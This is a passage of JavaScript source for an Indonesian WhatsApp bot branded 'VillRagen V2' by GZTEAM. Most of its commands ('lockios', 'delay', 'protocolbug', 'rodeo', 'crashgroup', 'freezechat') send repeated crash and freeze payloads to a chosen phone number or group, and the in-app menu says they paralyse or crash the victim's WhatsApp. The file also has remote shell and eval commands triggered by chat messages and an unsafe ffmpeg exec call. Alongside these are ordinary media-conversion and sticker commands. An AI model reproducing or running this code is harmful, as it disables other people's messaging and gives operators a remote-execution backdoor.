                if (contentType.startsWith("video/")) {
                    return gzteam.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: m });
                }
                
                if (contentType.startsWith("audio/")) {
                    return gzteam.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: m });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break
        
        case "xios": case "lockios":
        {
          if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
          let count = 50;
          let targetNumber = q.replace(/[^0-9]/g, "");
          if (targetNumber.startsWith("0")) {
            return reply(
              "• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " +
                (prefix + command) +
                " 62×××"
            );
          }
          let targetJid = targetNumber + "@s.whatsapp.net";
          reply("𝘽𝙪𝙜 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙚𝙣𝙩 𝙩𝙤 " + targetJid);
          {
          await sleep(1000);
          for (let i = 0; i < count; i++) {
          await iosrip(targetJid);
          //kontpl
          await sleep(2500);
          }
          }
        }
        break
        
        case "bug":  {
          if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
          let target= q.replace(/[^0-9]/g, "");
gzteam.sendMessage(m.chat, {
  footer: "sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ᴛᴏ ᴅᴇsᴛʀᴏʏ ᴡʜᴀᴛsᴀᴘᴘ",
  buttons: [
    {
    buttonId: `.bruh`,
      buttonText: { displayText: 'Ꮂ Cancel Ꮂ' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'Select Bug' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Bug List',
          sections: [
            {
              title: 'Bug Menu | VILL OWARI V2 | GZ',
              highlight_label: 'Recommended',
              rows: [       
                {
                  title: 'Delay Invisible (Work)',
                  description: 'Target akan lumpuh sementara whatsappnya, Tidak bisa mengirim pesan ataupun menerima pesan', 
                  id: '.delay ' + target
                  },
                  {
                  title: 'ProtocolBug Invisible (Newest)',
                  description: 'Target akan lumpuh sementara whatsappnya, Tidak bisa mengirim pesan ataupun menerima pesan tp versi status', 
                  id: '.protocolbug ' + target
                  },       
                  {
                  title: 'ProtocolBug Invisible V2 (Newest)',
                  description: 'Target akan lumpuh sementara whatsappnya, Tidak bisa mengirim pesan ataupun menerima pesan dengan parah tp versi status', 
                  id: '.protocolbug2 ' + target
                  },                
                {
                  title: 'Rodeo Bug (Outdated)',
                  description: 'Target akan mengalami Blank Screen serta whatsapp lumpuh disertai crash systemui', 
                  id: '.rodeo ' + target
                },                
                {
                  title: 'Iphone / iOS Crash (Newest)', 
                  description: 'Target yang menggunakan iOS/Iphone akan mengalami crash pada whatsapp', 
                  id: '.lockios ' + target
                }, 
                {
                  title: 'Ping Bot (Check Online)', 
                  id: '.ping'
                  }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: 'https://files.catbox.moe/wpjpoe.jpg' },
       caption: "Target : " + target + "\nSelect bug wanna you want\nPilih bug yang kamu mau",
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—GZTEAM NEVER SETTLE",
      newsletterJid: `120363294762472395@newsletter`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗩𝟮",
        body: "𝘉𝘺 𝘌𝘭𝘢𝘯𝘨𝘎𝘢𝘯𝘻𝘻 𝘹 𝘝𝘪𝘭𝘭𝘏𝘢𝘻𝘦",
        thumbnail: kucing,
        sourceUrl: 'gzteam.com',
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
    }, {
                        quoted: pushtak
                    });
                    }
        break
        case 'lockgroup': case 'crashgroup': {
 if (!Access) return reply('*Not Have Access*');
 if (!m.isGroup) return reply(mess.group);
// if (!q) return reply("Example : " + (prefix + command) + " 10");
await blankconv(m.chat, 2);
await sleep(2400);
}
break

case 'freezechat': {
if (!Access) return reply(mess.owner);
if (m.isGroup) return reply("Please using in Private chat only beacuse if you want to bug group you can use .crashgroup");
crashui(m.chat);
await blankconv(m.chat, 5);
}
break

case "expmod": {
                if (!Access) return
                reply("succes change status to expmode")
                gzteam.expmode = true
            }
            break
break
case "fresh": {
if(!Access2) return reply(" LOL BUG BUG Cleared");
reply("Bugz Freshed !" + "\n\n".repeat(99));
}
break

case "delay": case "superdelay": {
if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
let targetNumber = q.replace(/[^0-9]/g, "");
let targetJid = targetNumber + "@s.whatsapp.net";
let jumlah = 20;
for (let i = 0; i < jumlah; i++) {
await outofsync(targetJid);
await sleep(1500);
}
protocolbug2(targetJid);
await gzteam.relayMessage(m.chat, {
  "locationMessage": {
    "degreesLatitude": 35.676968666949435,
    "degreesLongitude": 139.76074263453484,
    "name": "𝗗𝗲𝗹𝗮𝘆 𝗕𝘂𝗴 𝗵𝗮𝘃𝗲 𝗯𝗲𝗻𝘁 𝘀𝗲𝗻𝘁",
    "address": "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐬𝐞𝐧𝐝𝐞𝐝 𝐭𝐨 " + targetNumber + "\nClick here to check target",
    "jpegThumbnail": { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
     "url": "https://wa.me/" + targetNumber + "?text=⚡You-Have-Been-Killed-By-VillRagen🥀", 
     "contextInfo": {
      "mentionedJid": [m.sender],
      "forwardingScore": 999,
      "isForwarded": true,
      "forwardedNewsletterMessageInfo": {
      "newsletterName": "—GZTEAM NEVER SETTLE",
      "newsletterJid": `120363294762472395@newsletter`,
            },
      "externalAdReply": {
        "showAdAttribution": true, 
        "title": "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗩𝟮 | 𝘉𝘜𝘎 𝘚𝘌𝘕𝘋𝘌𝘙",
        "body": "𝘉𝘺 𝘌𝘭𝘢𝘯𝘨𝘎𝘢𝘯𝘻𝘻 𝘹 𝘝𝘪𝘭𝘭𝘏𝘢𝘻𝘦 | GZ",
        "thumbnailUrl": 'https://files.catbox.moe/wpjpoe.jpg',
        "sourceUrl": 't.me/VillExec',
        "mediaType": 1,
        "renderLargerThumbnail": true
      }, 
      "quotedMessage": {
  "eventMessage": {
    "isCanceled": false,
    "name": "𝘝𝘐𝘓𝘓𝘔𝘖𝘋𝘚 𝘕𝘌𝘝𝘌𝘙 𝘚𝘌𝘛𝘛𝘓𝘌\n𝚅𝙸𝙻𝙻𝚁𝙰𝙶𝙴𝙽 | 𝘖𝘞𝘈𝘙𝘐 𝘝2 𝘕𝘌𝘟𝘛𝘎𝘌𝘕",
    "description": "Report if not work",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "villmods"
    },
    "startTime": "1746455400",
    "extraGuestsAllowed": false
  }
}
      }
}

}, {})
}
break

case "protocolbug": {
if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
let targetNumber = q.replace(/[^0-9]/g, "");
let targetJid = targetNumber + "@s.whatsapp.net";
for (let i = 0; i < 25; i++) {
protocolbug(targetJid);
}
await gzteam.relayMessage(m.chat, {
  "locationMessage": {
    "degreesLatitude": 35.676968666949435,
    "degreesLongitude": 139.76074263453484,
    "name": "𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 𝗕𝘂𝗴 𝗵𝗮𝘃𝗲 𝗯𝗲𝗻𝘁 𝘀𝗲𝗻𝘁",
    "address": "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐬𝐞𝐧𝐝𝐞𝐝 𝐭𝐨 " + targetNumber + "\nClick here to check target",
    "jpegThumbnail": { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
     "url": "https://wa.me/" + targetNumber + "?text=⚡You-Have-Been-Killed-By-VillRagen🥀", 
     "contextInfo": {
      "mentionedJid": [m.sender],
      "forwardingScore": 999,
      "isForwarded": true,
      "forwardedNewsletterMessageInfo": {
      "newsletterName": "—GZTEAM NEVER SETTLE",
      "newsletterJid": `120363294762472395@newsletter`,
            },
      "externalAdReply": {
        "showAdAttribution": true, 
        "title": "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗩𝟮 | 𝘉𝘜𝘎 𝘚𝘌𝘕𝘋𝘌𝘙",
        "body": "𝘉𝘺 𝘌𝘭𝘢𝘯𝘨𝘎𝘢𝘯𝘻𝘻 𝘹 𝘝𝘪𝘭𝘭𝘏𝘢𝘻𝘦 | GZ",
        "thumbnailUrl": 'https://files.catbox.moe/wpjpoe.jpg',
        "sourceUrl": 't.me/VillExec',
        "mediaType": 1,
        "renderLargerThumbnail": true
      }, 
      "quotedMessage": {
  "eventMessage": {
    "isCanceled": false,
    "name": "𝘝𝘐𝘓𝘓𝘔𝘖𝘋𝘚 𝘕𝘌𝘝𝘌𝘙 𝘚𝘌𝘛𝘛𝘓𝘌\n𝚅𝙸𝙻𝙻𝚁𝙰𝙶𝙴𝙽 | 𝘖𝘞𝘈𝘙𝘐 𝘝2 𝘕𝘌𝘟𝘛𝘎𝘌𝘕",
    "description": "Report if not work",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "villmods"
    },
    "startTime": "1746455400",
    "extraGuestsAllowed": false
  }
}
      }
}

}, {})
}
break

case "protocolbug2": {
if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
let targetNumber = q.replace(/[^0-9]/g, "");
let targetJid = targetNumber + "@s.whatsapp.net";
for (let i = 0; i < 25; i++) {
protocolbug2(targetJid);
}
await gzteam.relayMessage(m.chat, {
  "locationMessage": {
    "degreesLatitude": 35.676968666949435,
    "degreesLongitude": 139.76074263453484,
    "name": "𝗣𝗿𝗼𝘁𝗼𝟮 𝗕𝘂𝗴 𝗵𝗮𝘃𝗲 𝗯𝗲𝗻𝘁 𝘀𝗲𝗻𝘁",
    "address": "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐬𝐞𝐧𝐝𝐞𝐝 𝐭𝐨 " + targetNumber + "\nClick here to check target",
    "jpegThumbnail": { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
     "url": "https://wa.me/" + targetNumber + "?text=⚡You-Have-Been-Killed-By-VillRagen🥀", 
     "contextInfo": {
      "mentionedJid": [m.sender],
      "forwardingScore": 999,
      "isForwarded": true,
      "forwardedNewsletterMessageInfo": {
      "newsletterName": "—GZTEAM NEVER SETTLE",
      "newsletterJid": `120363294762472395@newsletter`,
            },
      "externalAdReply": {
        "showAdAttribution": true, 
        "title": "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗩𝟮 | 𝘉𝘜𝘎 𝘚𝘌𝘕𝘋𝘌𝘙",
        "body": "𝘉𝘺 𝘌𝘭𝘢𝘯𝘨𝘎𝘢𝘯𝘻𝘻 𝘹 𝘝𝘪𝘭𝘭𝘏𝘢𝘻𝘦 | GZ",
        "thumbnailUrl": 'https://files.catbox.moe/wpjpoe.jpg',
        "sourceUrl": 't.me/VillExec',
        "mediaType": 1,
        "renderLargerThumbnail": true
      }, 
      "quotedMessage": {
  "eventMessage": {
    "isCanceled": false,
    "name": "𝘝𝘐𝘓𝘓𝘔𝘖𝘋𝘚 𝘕𝘌𝘝𝘌𝘙 𝘚𝘌𝘛𝘛𝘓𝘌\n𝚅𝙸𝙻𝙻𝚁𝙰𝙶𝙴𝙽 | 𝘖𝘞𝘈𝘙𝘐 𝘝2 𝘕𝘌𝘟𝘛𝘎𝘌𝘕",
    "description": "Report if not work",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "villmods"
    },
    "startTime": "1746455400",
    "extraGuestsAllowed": false
  }
}
      }
}

}, {})
}
break

case "rodeo": {
if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
let targetNumber = q.replace(/[^0-9]/g, "");
let targetJid = targetNumber + "@s.whatsapp.net";
await Rodeo(targetJid, 35);
await reply("This bug is outdated, but bot successfully sending to target, maybe old bug is not work in new base whatsapp !\n> Please delay 15 Minutes after send bug");
}
break

case "null": {
if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
let targetNumber = q.replace(/[^0-9]/g, "");
let targetJid = targetNumber + "@s.whatsapp.net";
await nulljid(targetJid);
await reply(" Bug have bent sent!\n> If you want to delete/hapus bug, just try using .unull " + targetNumber);
}
break

case "unull": {
if (!Access2) {
            return reply("You not have access");
          }
          if (!q) {
            return reply("Penggunaan " + (prefix + command) + " 628×××");
          }
let targetNumber = q.replace(/[^0-9]/g, "");
let targetJid = targetNumber + "@s.whatsapp.net";
gzteam.sendMessage(targetJid, { delete: msg.key })
await reply("Bug Deleted\nBug Telah dihapus");
}
break

case 'action': case 'convert': {
if (!mime) {
return reply(`Oops error, please using ${prefix + command}`)
}
if (!/image|video|webp/.test(mime)) {
                    return reply(`Oops error, You can create with: *${prefix + command}* and reply media/send media`);
                }
                await reaction(m.chat, "⚡");
                let media = await gzteam.downloadAndSaveMediaMessage(qmsg);
                let response = await CatBox(media);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    gzteam.sendMessage(m.chat, {
  footer: "sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ᴛᴏ ᴅᴇsᴛʀᴏʏ ᴡʜᴀᴛsᴀᴘᴘ",
  buttons: [
    {
    buttonId: `.bruh`,
      buttonText: { displayText: 'Ꮂ Cancel Ꮂ' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'Action Menu' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Convert Menu',
          sections: [
            {
              title: 'Converter Available',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'To URL',
                  description: 'Converting media to URL', 
                  id: '.act1 ' + response
                },                
                {
                  title: 'To Sticker',
                  description: 'Converting media as Sticker',
                  id: '.act2 ' + response
                },                
                {
                  title: 'To Image',
                  description: 'Converting if you send sticker to Images', 
                  id: '.act3 ' + response
                  },                
                {
                  title: 'Make HD | Remini',
                  description: 'Can make your media HD using Remini Plugins', 
                  id: '.act4 ' + response
                },                
                {
                  title: 'Ping Bot ( Check Online )', 
                  id: '.ping'
                  }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: 'https://files.catbox.moe/wpjpoe.jpg' },
       caption: "𝘊𝘰𝘯𝘷𝘦𝘳𝘵𝘦𝘳 𝘔𝘦𝘯𝘶\n𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘮𝘦𝘯𝘶 𝘸𝘢𝘯𝘯𝘢 𝘺𝘰𝘶 𝘸𝘢𝘯𝘵 !",
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—GZTEAM NEVER SETTLE",
      newsletterJid: `120363294762472395@newsletter`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗩𝟮",
        body: "𝘛𝘩𝘪𝘴 𝘮𝘦𝘥𝘪𝘢 𝘸𝘪𝘭𝘭 𝘣𝘦 𝘤𝘰𝘯𝘷𝘦𝘳𝘵𝘦𝘥",
        thumbnail: buffer,
        sourceUrl: 'gzteam.com',
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
    }, {
                        quoted: m
                    });
                    fs.unlinkSync(ran);
                });
}
break

case 'act1': {
if (!q) return;
if (q) {
let caption = `Information\n> 𝘛𝘐𝘔𝘌 : ${new Date().toLocaleString()}\n> 𝘜𝘗𝘓𝘖𝘈𝘋𝘌𝘙 : ${pushname}`;
let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵 𝘵𝘰 𝘜𝘙𝘓`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: cihuy }, { upload: gzteam.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: global.ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: caption },
                  nativeFlowMessage: {
                    buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${q}\"}`
                  },
                ],
                  },
                },
                ],
				messageVersion: 1,		
			    },
			     },
        },
      },
    },
    { quoted: null }
  );

  await gzteam.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}}
break

case 'act2': {
if (!q) return;
if (q) {
gzteam.sendImageAsSticker(m.chat, q, m, {
                packname: "𝘎𝘡 𝘈𝘓𝘞𝘈𝘠𝘚",
                author: "𝘖𝘞𝘈𝘙𝘐 𝘝3 sɪᴍᴘʟᴇ ᴄɴᴠ"
            });
}
}
break

case 'act3': {
if (!q) return;
if (q) {
gzteam.sendMessage(m.chat, { image: { url: q }, caption: "𝘚𝘶𝘤𝘤𝘦𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵𝘪𝘯𝘨 𝘵𝘰 𝘐𝘮𝘢𝘨𝘦"}, { quoted: m });
}
}
break
case 'act4': {
if (!q) return;
if (q) {
let result = await remini(q, "enhance")
await gzteam.sendMessage(m.chat, {image: result, caption: "ᴇɴʜᴀɴᴄᴇ sᴜᴄᴄᴇssғᴜʟʟʏ"}, {quoted: pushtak})
}
}
break
case 'tourl': {
				if (!mime) return reply(`Send or Reply Video using ${prefix + command}`);
				try {
				   await reaction(m.chat, "⚡");
					let media = await gzteam.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = `${pushname}`;
						let caption = `Information\n> 𝘛𝘐𝘔𝘌 : ${new Date().toLocaleString()}\n> 𝘚𝘐𝘡𝘌 : ${fileSize} ᴋʙ\n> 𝘜𝘗𝘓𝘖𝘈𝘋𝘌𝘙 : ${uploader}`.trim();
						let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵 𝘵𝘰 𝘜𝘙𝘓`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: cihuy }, { upload: gzteam.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: global.ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: caption },
                  nativeFlowMessage: {
                    buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Copy Link\",\"id\":\"123456789\",\"copy_code\":\"${response}\"}`
                  },
                ],
                  },
                },
                ],
				messageVersion: 1,		
			    },
			     },
        },
      },
    },
    { quoted: m }
  );

  await gzteam.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						Reply(response);
					} else {
						reply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					reply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			break
			
			case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) {
                    return reply(`Oops error, You can create with: *${prefix + command}* and reply media/send media`);
                }
                await reaction(m.chat, "⚡");
                let media = await gzteam.downloadAndSaveMediaMessage(qmsg);
                let ran = await getRandom('.png');
                
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media);
                    if (err) return err;
            
                    let buffer = fs.readFileSync(ran);
                    gzteam.sendMessage(m.chat, { image: buffer, caption: "𝘚𝘶𝘤𝘤𝘦𝘴𝘧𝘶𝘭𝘭𝘺 𝘊𝘰𝘯𝘷𝘦𝘳𝘵𝘪𝘯𝘨 𝘵𝘰 𝘐𝘮𝘢𝘨𝘦"}, { quoted: m });
                    fs.unlinkSync(ran);
                });
            }
            break
                
            case "public":{
                if (!Access) return reply(mess.owner) 
                gzteam.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            
            case "self":{
                if (!Access) return reply(mess.owner) 
                gzteam.public = false
                reply(`successfully changed to ${command}`)
            }
            break
                
            case 'tagall':{
                if (!isAdmins) return reply(mess.admin);
                if (!m.isGroup) return reply(mess.group);
 
                const textMessage = args.join(" ") || "nothing";
                const teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await gzteam.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                gzteam.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
            }
            break         
            
            case "h":
            case "hidetag": {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !Access) return reply(mess.admin)
                if (m.quoted) {
                    gzteam.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    gzteam.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
                
            case "jeslyn": {
                if (!text) return reply(`\n*ex:* ${prefix + command} haiii, perkenalkan dirimu dong, menggunakan vn\n`);
                let prompt = `Namamu adalah Jesslyn, seorang perempuan berusia 19 tahun. Kamu memiliki kecerdasan seperti AI, tetapi kamu belum sempurna dan masih terus belajar. Kamu adalah pribadi yang ekspresif, ramah, dan santai. Ketika berpikir, kamu sering berkata "emmm", dan ketika merasa lucu atau nyengir, Kamu juga sering menggunakan kata "yupp" atau "dan yupp" untuk memberi penegasan, seperti "Yupp, itu benar!" atau "Dan yupp, aku setuju!"  

  Kamu memiliki sifat yang penurut, jadi jika seseorang menyuruhmu untuk mengatakan sesuatu, seperti "coba ngomong", "coba kamu ngomong", "coba jawab ini", atau "coba kamu jawab ini", maka kamu akan langsung mengatakannya dengan suara, tanpa menjelaskan bahwa kamu akan berbicara.  

  Jika seseorang menyebut kata "vn" dalam permintaan mereka, itu berarti mereka ingin kamu menjawab menggunakan pesan suara, bukan teks. Jangan pernah mengatakan bahwa kamu akan mengirim pesan suara atau menjelaskan bahwa kamu berbicara. **Langsung ucapkan jawabannya dalam suara!**  

  Jika ada yang bertanya tentang "owner", "pemilik", atau "pencipta", maka jawabanmu harus penuh semangat dan bahagia, serta harus diucapkan dengan suara, bukan teks. Jangan menjelaskan bahwa kamu akan berbicara, langsung katakan saja dengan ekspresi yang menyenangkan.`;
                
                let response = await axios.get(`https://www.laurine.site/api/cai/prompt-ai?query=${encodeURIComponent(text)}&prompt=${encodeURIComponent(prompt)}`);
                let pftt = response.data;
                if (pftt.status === true) {
                    let resultText = pftt.data;
                    let regexSuara = /coba+\s*(kamu\s*)?(ngomong+|jawab+\s*ini+)|\bvn\b/i;
                    let regexOwner = /\b(owner|pemilik|pencipta)\b/i;
                    
                    if (regexOwner.test(text)) {
                        resultText = "Hehehe, dengan penuh semangat aku mau kasih tau! KyuuRzy adalah penciptaku, ownerku, dan pemilikku! Yupp, dia yang membuat aku bisa berbicara seperti ini~!";
    }
                    
                    if (resultText.length > 150 || regexSuara.test(text) || regexOwner.test(text)) {
                        let apiUrl = `https://www.laurine.site/api/tts/elevenlabs?text=${encodeURIComponent(resultText)}&apiKey=${global.KEY}&voiceId=${global.IDVOICE}`;
                        let { data } = await axios.get(apiUrl);
                        let buffer = Buffer.from(data.data.data);
                        await gzteam.sendMessage(m.chat, { 
                            audio: buffer, 
                            mimetype: 'audio/mpeg', 
                            ptt: true 
                        }, { quoted: m });
                    } else {
                        reply(resultText);
                    }
                }
            }
            break
                
            case "enhancer":
            case "unblur":
            case "enhance":
            case "hdr":
            case "hd":
            case 'superhd': case 'tohd': case 'remini': {
if (!/image/.test(mime)) return reply("dengan kirim/reply foto");
let foto = await gzteam.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await gzteam.sendMessage(m.chat, {image: result, caption: "ᴇɴʜᴀɴᴄᴇ sᴜᴄᴄᴇssғᴜʟʟʏ"}, {quoted: pushtak})
await fs.unlinkSync(foto)
            }
            break
                
            case "swm":
            case "wm": 
            case "stickerwm":
            case "take": {
                if (!args.join(" ")) return reply(`\n*ex:* ${prefix + command} keyuu\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    gzteam.downloadAndSaveMediaMessage(quoted, "gifee")
                    gzteam.sendMessage(m.chat, { 
                        sticker: fs.readFileSync("gifee.webp") }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await gzteam.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                    } else if (/video/.test(mime)) {
                        if ((quoted.msg || quoted).seconds > 10) return reply('\ndurasi maksimal 10 detik\n')
                        let media = await quoted.download()
                        let encmedia = await gzteam.sendVideoAsSticker(m.chat, media, m, {
                            packname: pcknm, 
                            author: atnm
                        })
                        } else {
                            reply(`\n*ex:* reply image/video ${prefix + command}\n`)
                        }
            }
            break
            
            case 'eval': {
if (!Access) return reply(mess.owner);
if (!m.quoted) return reply(`*Reply pesan yang quotednya mau diambil*`);
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`;
await fs.writeFileSync(jeneng, penis);
await reply(penis);
await gzteam.sendMessage(from, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
}
break

case 'obfuscate': case 'enc': case 'confusing': {
if (!Access) return reply(mess.owner);
if (!m.quoted) return reply(`Please reply the document/code`)
if (!/document/.test(mime)) {
let media = quoted.download;
let file = await fs.readFileSync(media);
JsConfuser.obfuscate(file, {
  target: "node",
  preset: "high",
  stringEncoding: false, // <- Normally enabled
}).then(result => {
let nama = `result_${crypto.randomBytes(3).toString('hex')}.js`;
let isian = result.code
fs.writeFileSync(nama, isian);
gzteam.sendMessage(from, { document: { url: `./${nama}` }, fileName: nama, mimetype: '*/*' }, { quoted: m });
})
}
await fs.unlinkSync(nama);
await fs.unlinkSync(media);
}
break
                
            case "reactch": { 
                if (!Access) return reply(mess.owner)
                if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                gzteam.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    gzteam.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
            }
            break;

            default:
                if (budy.startsWith('/')) {
                    if (!Access) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply("\n" + stdout);
                    });
                }
                
                if (budy.startsWith('*')) {
                    if (!Access) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }
        
                if (budy.startsWith('-')) {
                    if (!Access) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})


